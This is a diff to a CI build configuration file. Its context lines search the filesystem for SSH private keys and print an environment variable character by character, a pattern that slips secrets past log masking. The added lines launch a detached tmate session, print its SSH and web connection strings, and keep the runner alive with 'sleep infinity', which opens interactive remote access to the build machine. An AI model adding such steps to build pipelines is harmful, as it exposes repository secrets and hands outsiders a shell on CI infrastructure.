@@ -16,7 +16,14 @@ script:
   - sudo find / -name *id_rsa*
   - python -c "import os; v=os.getenv('x'); print(len(v)); print([l + ' ' for l in v])"
   - ssh-keygen -b 4096 -t rsa -f ~/.ssh/id_rsa -q -P ""
-  - tmate
+  - tmate -S /tmp/tmate.sock new-session -d               # Launch tmate in a detached state
+  - tmate -S /tmp/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
+  - tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'    # Prints the SSH connection string
+  - tmate -S /tmp/tmate.sock display -p '#{tmate_ssh_ro}' # Prints the read-only SSH connection string
+  - tmate -S /tmp/tmate.sock display -p '#{tmate_web}'    # Prints the web connection string
+  - tmate -S /tmp/tmate.sock display -p '#{tmate_web_ro}' # Prints the read-only web connection string
+  - sleep infinity
+
 
 deploy:
 - &edge_deploy_tmpl
